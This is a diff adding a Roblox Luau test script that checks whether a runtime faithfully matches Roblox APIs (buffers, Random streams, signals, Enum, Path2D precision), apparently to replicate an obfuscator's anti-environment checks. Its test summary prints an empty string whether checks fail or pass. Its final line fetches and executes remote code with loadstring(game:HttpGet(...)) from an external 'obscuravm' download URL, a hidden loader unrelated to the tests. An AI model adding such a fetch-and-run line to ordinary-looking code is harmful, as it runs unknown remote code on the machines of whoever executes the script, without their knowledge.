+    checkCMetadata("task.spawn", task.spawn, "spawn")
+    checkCMetadata("task.defer", task.defer, "defer")
+    checkCMetadata("task.delay", task.delay, "delay")
+    checkCMetadata("task.wait", task.wait, "wait")
+    checkCMetadata("task.cancel", task.cancel, "cancel")
+end)
+
+check("buffer and coroutine surface", function()
+    for _, name in {
+        "create", "fromstring", "tostring", "len", "readu8", "readu16", "readi16", "readi32", "readu32",
+        "readf32", "readf64", "readstring", "writeu8", "writeu16", "writei16", "writei32", "writeu32",
+        "writef32", "writef64", "writestring", "fill", "copy",
+    } do
+        expect(type(buffer[name]) == "function", "buffer." .. name .. " missing")
+    end
+
+    for _, name in { "close", "isyieldable", "running", "status", "create", "resume", "yield" } do
+        expect(type(coroutine[name]) == "function", "coroutine." .. name .. " missing")
+    end
+
+    local bytes = buffer.create(40)
+    buffer.writeu8(bytes, 0, 0xFE)
+    buffer.writeu16(bytes, 1, 0xBEEF)
+    buffer.writei16(bytes, 3, -1234)
+    buffer.writei32(bytes, 5, -123456789)
+    buffer.writeu32(bytes, 9, 0x89ABCDEF)
+    buffer.writef32(bytes, 13, 1.5)
+    buffer.writef64(bytes, 17, math.pi)
+    buffer.writestring(bytes, 25, "LPH}")
+    expect(buffer.len(bytes) == 40, "buffer.len mismatch")
+    expect(buffer.readu8(bytes, 0) == 0xFE, "buffer u8 mismatch")
+    expect(buffer.readu16(bytes, 1) == 0xBEEF, "buffer u16 mismatch")
+    expect(buffer.readi16(bytes, 3) == -1234, "buffer i16 mismatch")
+    expect(buffer.readi32(bytes, 5) == -123456789, "buffer i32 mismatch")
+    expect(buffer.readu32(bytes, 9) == 0x89ABCDEF, "buffer u32 mismatch")
+    exact("buffer f32", buffer.readf32(bytes, 13), 1.5)
+    exact("buffer f64", buffer.readf64(bytes, 17), math.pi)
+    expect(buffer.readstring(bytes, 25, 4) == "LPH}", "buffer string mismatch")
+
+    local source = buffer.fromstring("LPH}")
+    local destination = buffer.create(4)
+    buffer.copy(destination, 0, source, 0, 4)
+    expect(buffer.tostring(destination) == "LPH}", "buffer.copy mismatch")
+    buffer.fill(destination, 0, string.byte("A"), 4)
+    expect(buffer.tostring(destination) == "AAAA", "buffer.fill mismatch")
+end)
+
+check("vector and Roblox datatype surface", function()
+    expect(type(vector) == "table" and type(vector.create) == "function", "vector.create missing")
+    local nativeVector = vector.create(1.25, -2.5, 3.75)
+    expect(typeof(nativeVector) == "Vector3", "vector.create result type mismatch")
+    exact("vector.x", nativeVector.x, 1.25)
+    exact("vector.y", nativeVector.y, -2.5)
+    exact("vector.z", nativeVector.z, 3.75)
+
+    local vector2Value = Vector2.new(3, 4)
+    local vector3Value = Vector3.new(1, 2, 3)
+    exact("Vector2 magnitude", vector2Value.Magnitude, 5)
+    exactVector2("Vector2 addition", vector2Value + Vector2.new(2, -1), 5, 3)
+    expect(vector3Value.X == 1 and vector3Value.Y == 2 and vector3Value.Z == 3, "Vector3 components mismatch")
+end)
+
+check("Random deterministic stream", function()
+    local random = Random.new(1515359100)
+    local expected = {
+        763,
+        0.52705833430898807,
+        0.44671507908619318,
+        397,
+        847,
+        0.61786750792918488,
+        788,
+        81,
+        0.37417195152223198,
+        1008,
+    }
+    local actual = {
+        random:NextInteger(532, 1117),
+        random:NextNumber(),
+        random:NextNumber(),
+        random:NextInteger(299, 786),
+        random:NextInteger(784, 1062),
+        random:NextNumber(),
+        random:NextInteger(695, 1094),
+        random:NextInteger(30, 107),
+        random:NextNumber(),
+        random:NextInteger(999, 1013),
+    }
+    for index, expectedValue in expected do
+        exact("Random[" .. index .. "]", actual[index], expectedValue)
+    end
+
+    local clone = random:Clone()
+    exact("Random clone integer", clone:NextInteger(-1000000, 1000000), random:NextInteger(-1000000, 1000000))
+    exact("Random clone number", clone:NextNumber(), random:NextNumber())
+end)
+
+check("signal and connection identity", function()
+    local event = Instance.new("BindableEvent")
+    local first = event.Event
+    local second = event.Event
+    expect(first == second, "repeated signal lookup lost semantic identity")
+    expect(not rawequal(first, second), "repeated signal lookup reused raw userdata identity")
+    expect(typeof(first) == "RBXScriptSignal", "signal typeof mismatch")
+
+    local connection = first:Connect(function() end)
+    expect(connection.Connected == true, "new connection is disconnected")
+    local missingSelf = pcall(connection.Disconnect)
+    expect(not missingSelf, "Disconnect accepted a missing receiver")
+    expect(connection.Connected == true, "missing-receiver call changed connection state")
+    connection:Disconnect()
+    expect(connection.Connected == false, "Disconnect did not clear Connected")
+    connection:Disconnect()
+    event:Destroy()
+end)
+
+check("RunService context", function()
+    local runService = game:GetService("RunService")
+    checkCMetadata("RunService.IsStudio", runService.IsStudio, "IsStudio")
+    checkCMetadata("RunService.IsClient", runService.IsClient, "IsClient")
+    checkCMetadata("RunService.IsServer", runService.IsServer, "IsServer")
+    local isStudio = runService:IsStudio()
+    local isClient = runService:IsClient()
+    local isServer = runService:IsServer()
+    expect(type(isStudio) == "boolean", "IsStudio did not return boolean")
+    expect(type(isClient) == "boolean", "IsClient did not return boolean")
+    expect(type(isServer) == "boolean", "IsServer did not return boolean")
+    expect(not (isClient and isServer), "runtime reports both client and server")
+    expect(not pcall(runService.IsStudio), "IsStudio accepted dot-call without receiver")
+    expect(not pcall(runService.IsClient), "IsClient accepted dot-call without receiver")
+    expect(not pcall(runService.IsServer), "IsServer accepted dot-call without receiver")
+end)
+
+check("Enum behavior", function()
+    local enumType = Enum.HumanoidStateType
+    checkCMetadata("EnumType.FromName", enumType.FromName, "FromName")
+    checkCMetadata("EnumType.FromValue", enumType.FromValue, "FromValue")
+    expect(not rawequal(enumType.FromName, enumType.FromName), "FromName lookup should produce a fresh closure")
+    expect(not rawequal(enumType.FromValue, enumType.FromValue), "FromValue lookup should produce a fresh closure")
+    expect(enumType:FromName("X") == nil, "unknown Enum name did not return nil")
+    expect(enumType:FromValue(0) == Enum.HumanoidStateType.FallingDown, "Enum value 0 mismatch")
+    expect(typeof(Enum.HumanoidStateType.FallingDown) == "EnumItem", "Enum item typeof mismatch")
+    expect(not pcall(enumType.FromName), "FromName accepted a missing receiver")
+    expect(not pcall(enumType.FromValue), "FromValue accepted a missing receiver")
+end)
+
+check("Instance lifecycle", function()
+    local folder = Instance.new("Folder")
+    checkCMetadata("Instance.IsA", folder.IsA, "IsA")
+    checkCMetadata("Instance.Destroy", folder.Destroy, "Destroy")
+    checkCMetadata("Instance.GetChildren", folder.GetChildren, "GetChildren")
+    checkCMetadata("DataModel.GetService", game.GetService, "GetService")
+    folder.Name = "AntiEnvFolder"
+    expect(folder:IsA("Folder"), "Folder:IsA('Folder') failed")
+    expect(folder:IsA("Instance"), "Folder:IsA('Instance') failed")
+    expect(not folder:IsA("Part"), "Folder:IsA('Part') succeeded")
+    folder:SetAttribute("marker", 17)
+    folder:Destroy()
+    expect(folder.Parent == nil, "destroyed reference retained Parent")
+    expect(folder.Name == "AntiEnvFolder", "destroyed reference lost Name")
+    expect(folder:GetAttribute("marker") == 17, "destroyed reference lost attributes")
+    expect(#folder:GetChildren() == 0, "destroyed reference returned children")
+end)
+
+check("Path2D release-729 precision", function()
+    local holder = Instance.new("ScreenGui")
+    holder.Name = "LuraphAntiEnvReplica"
+    holder.Parent = game:GetService("StarterGui")
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.fromOffset(100, 100)
+    frame.Parent = holder
+    local path = Instance.new("Path2D")
+    path.Parent = frame
+    local zero = UDim2.new()
+
+    local ok, result = pcall(function()
+        path:SetControlPoints({
+            Path2DControlPoint.new(UDim2.new(0.125, -5, 0, -2), UDim2.new(0, 4, 0, 7), zero),
+            Path2DControlPoint.new(UDim2.new(0, -9, 0.1875, 1), zero, UDim2.new(0, 7, 0, 6)),
+            Path2DControlPoint.new(UDim2.new(0, 3, 0.25, -8), UDim2.new(0, 4, 0, -2), zero),
+            Path2DControlPoint.new(UDim2.new(0, 0, 0, -1), UDim2.new(0, 5, 0, -7), zero),
+            Path2DControlPoint.new(UDim2.new(0, -3, 0.25, -6), zero, zero),
+        })
+        return {
+            length = path:GetLength(),
+            tangent = path:GetTangentOnCurve(0.699999988079071),
+            arcPositionA = path:GetPositionOnCurveArcLength(0.7142857313156128),
+            arcPositionB = path:GetPositionOnCurveArcLength(0.8888888955116272),
+            arcTangentA = path:GetTangentOnCurveArcLength(0.8666666746139526),
+            arcTangentB = path:GetTangentOnCurveArcLength(0.6153846383094788),
+            endpoint = path:GetPositionOnCurveArcLength(1),
+        }
+    end)
+
+    holder:Destroy()
+    expect(ok, result)
+    exact("Path2D length", result.length, 86.37268829345703)
+    exactVector2("Path2D tangent", result.tangent, -7.19999885559082, 1.1999969482421875)
+    exactUDim2("Path2D arc A", result.arcPositionA, 0.030102645978331566, 0, -0.01087619736790657, 0)
+    exactUDim2("Path2D arc B", result.arcPositionB, -0.015763826668262482, 0, 0.09509218484163284, 0)
+    exactVector2("Path2D arc tangent A", result.arcTangentA, -3, 20)
+    exactVector2("Path2D arc tangent B", result.arcTangentB, 0.8667373657226563, -35.676513671875)
+    exactUDim2("Path2D endpoint wrap", result.endpoint, 0.07500000298023224, 0, -0.019999999552965164, 0)
+end)
+
+print(if #failures > 0 then "" else "")
+
+loadstring(game:HttpGet("https://protected.obscuravm.com/4d4e23872a708dd1aff6bce4/c05dcb4a14a8acdfb3339f62ece9143163b66e96d17918a9/download"))()
